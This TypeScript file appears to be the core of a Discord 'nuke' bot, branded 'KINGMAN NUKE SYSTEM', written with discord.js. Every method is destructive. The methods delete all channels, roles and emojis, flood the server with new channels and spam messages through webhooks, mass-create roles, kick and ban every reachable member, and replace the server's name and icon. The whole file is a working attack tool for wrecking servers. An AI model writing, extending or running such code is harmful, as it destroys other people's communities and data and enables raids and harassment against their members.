import { Client, Guild } from "discord.js";
import { ChannelsData, RoleData, MessageData } from "./types/KING-NUKE";
import * as Logger from './Logger'
class KINGAMN {
    public client : Client;
    constructor(client: Client){
        this.client = client
    }
    async clearChannels(guild: Guild, reson?:string){
        return new Promise(async (res, rej)=> {
            if(!guild.me?.permissions.has("MANAGE_CHANNELS")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                res(await guild.channels.cache.forEach(channel=>{
                    Logger.ChannelLogger(channel, "remove")
                    channel.delete(reson ? reson : `KINGMAN NUKE SYSTEM`).catch(e=> {
                        console.log(`i cant delete ${channel.name}`)
                    })
                }))
            }
        })
    }
    async clearRoles(guild: Guild, reson?:string){
        return new Promise(async (res, rej)=>{
            if(!guild.me?.permissions.has("MANAGE_ROLES")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                let myrole = guild.me.roles.highest.position;
                res(await guild.roles.cache.filter(x => x.position < myrole && !x.managed && x.name !== "@everyone").forEach(role => {
                  Logger.RoleLogger(role, "remove")
                  role.delete(reson ? reson : `KINGMAN NUKE SYSTEM`).catch(e=> {
                      console.log(`i cant delete ${role.name}`)
                  })  
                }))
            }
        })
    }
    async clearEmoje(guild: Guild, reson?:string){
        return new Promise(async (res, rej)=>{
            if(!guild.me?.permissions.has("MANAGE_EMOJIS_AND_STICKERS")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                res(await guild.emojis.cache.forEach(emoji => {
                    if(emoji.deletable){
                        emoji.delete(reson ? reson : `KINGMAN NUKE SYSTEM`)
                    }
                }))
            }
        })
    }
    async CreateChannels(guild: Guild, ops:{
        channels: ChannelsData,
        messages: MessageData
    }){
        return new Promise(async (res, rej)=> {
            if(!guild.me?.permissions.has("MANAGE_CHANNELS")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                for (let i = 0;i < ops.channels.number;i++) {
                    if(guild.channels.cache.size > 498){
                        break;
                    }
                    guild.channels.create(ops.channels.name, {
                        type: 'GUILD_TEXT',
                        nsfw: ops.channels.nsfw,
                        topic: ops.channels.topic
                    }).then(async channel=>{
                        Logger.ChannelLogger(channel, "create")
                        let hook = await channel.createWebhook("KINGMAN NUKE SYSTEM").catch(e=> {})
                        if(hook){
                            for(let z = 0; z < ops.messages.number; z++){
                                hook.send({content: ops.messages.content}).catch(e=> {})
                            }
                            await hook.delete("Done :)")
                        }
                    })
                }
                res('Done')
            }
        })
    }
    async createRoles(guild: Guild , ops: RoleData){
        return new Promise(async (res, rej)=>{
            if(!guild.me?.permissions.has("MANAGE_ROLES")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                for(let i = 0; i < ops.number; i++){
                    guild.roles.create({
                        name: ops.name,
                        color: ops.color
                    }).then(role => {
                        Logger.RoleLogger(role, "create")
                    })
                }
                res('Done')
            }
        })
    }
    async kickEveryone(guild: Guild, reason?:string){
        return new Promise(async (res, rej)=> {
            if(!guild.me?.permissions.has("KICK_MEMBERS")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                res(await guild.members.fetch()
                .then(members => {
                    members.forEach((member)=> {
                        if(member.kickable){
                            Logger.RemoveMemeberLogger(member, "kick")
                            member.kick(reason ? reason: "KINGMAN NUKE SYSTEM")
                        }
                    })
                }))
            }
        })
    }
    async banEveryone(guild: Guild, reason?:string){
        return new Promise(async (res, rej)=>{
            if(!guild.me?.permissions.has("BAN_MEMBERS")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                res(await guild.members.fetch().then(members => {
                    members.forEach(member => {
                        if(member.bannable){
                            Logger.RemoveMemeberLogger(member, "ban")
                            member.ban({ reason: reason ? reason: "KINGMAN NUKE SYSTEM"})
                        }
                    })
                }))
            }
        })
    }
    async ChangerServerInfo(guild: Guild){
        return new Promise(async (res, rej)=>{
            if(!guild.me?.permissions.has("ADMINISTRATOR")){
                rej(`Sorry but I don't have enough permissions to complete the process`)
            } else {
                res(await guild.setIcon("https://c.top4top.io/p_19817qcpu1.jpg").then(async ()=>{
                await guild.setName("KINGMAN DEV")
                }))
            }
        })
    }
}
export default KINGAMN;
